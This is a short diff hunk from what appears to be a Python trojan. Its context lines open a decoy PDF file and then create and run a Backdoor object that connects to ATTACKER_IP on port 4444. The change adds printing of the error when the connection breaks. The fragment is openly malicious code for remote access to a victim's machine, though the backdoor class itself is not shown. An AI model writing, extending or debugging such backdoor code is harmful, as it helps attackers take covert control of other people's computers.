@@ -144,5 +144,6 @@ subprocess.Popen(file_name, shell=True) # Open the pdf file
 try:
     my_backdoor = Backdoor(ATTACKER_IP, 4444) # Create an object of the class
     my_backdoor.run() # Call the run method
-except Exception:
+except Exception as e:
+    print(f"Connection broken due to {e}")
     sys.exit()
